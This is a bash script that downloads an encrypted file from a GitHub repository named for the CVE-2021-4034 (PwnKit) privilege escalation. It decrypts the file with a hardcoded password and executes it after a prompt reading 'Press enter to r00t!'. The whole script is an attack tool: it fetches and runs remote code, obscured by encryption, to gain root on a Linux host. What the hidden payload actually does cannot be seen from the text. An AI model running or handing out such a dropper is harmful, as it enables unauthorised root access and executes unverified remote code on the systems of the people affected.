#!/bin/bash

# Downloads the exploit with wget and utilizes curl if wget fails
wget -O /tmp/4034.sh https://raw.githubusercontent.com/n3onhacks/CVE-2021-4034-BASH-One-File-Exploit/main/4034.sh || curl https://raw.githubusercontent.com/n3onhacks/CVE-2021-4034-BASH-One-File-Exploit/main/4034.sh -o /tmp/4034.sh
# Decrypts file and outputs the result
openssl enc -d -aes-256-cbc -pass 'pass:n3on' -in /tmp/4034.sh -out /tmp/n3on.sh
# Makes sure that the decrypted shell script exists
while [ ! -f /tmp/n3on.sh ]; do sleep 1; done
# Makes script executable, and prompts user to hit enter to execute script 
chmod +x /tmp/n3on.sh
read -p $'\e[31mPress enter to r00t!\e[0m'
bash /tmp/n3on.sh
